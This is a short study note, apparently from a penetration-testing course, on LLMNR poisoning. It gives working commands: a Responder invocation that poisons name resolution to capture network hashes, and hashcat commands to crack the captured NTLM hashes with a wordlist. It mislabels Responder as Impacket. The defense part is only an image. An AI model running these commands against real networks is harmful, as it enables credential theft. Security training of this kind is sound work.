# LLMNR Poisoning

## What is LLMNR

![image](https://user-images.githubusercontent.com/96747355/167956823-a8f3ac8f-e971-463e-8c67-ba26f5f6e774.png)  
*Source: TCM Security Academy*
![image](https://user-images.githubusercontent.com/96747355/167956838-6185b47d-dfc8-4cb1-9a4e-39814a7a795b.png)  
*Source: TCM Security Academy*

## Responder

- [Impacket](https://github.com/SecureAuthCorp/impacket): tool to abuse LLMNR:  
Best to run first thing in the morning  
```responder -I eth0 -rdwv```
And when there will be activity in the network we will be able to get hashes

## Hascat

- We use hashcat to crack the hashes we got previously
- When looking for a module in hascat we can grep on the hash we need:
```hashcat --help | grep NTLM```
- Command
```hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt```

## LLMNR Poisoning Defense

![image](https://user-images.githubusercontent.com/96747355/167956945-7978a93c-5fdf-425a-90e6-87baed015c74.png)  
*Source: TCM Security Academy*
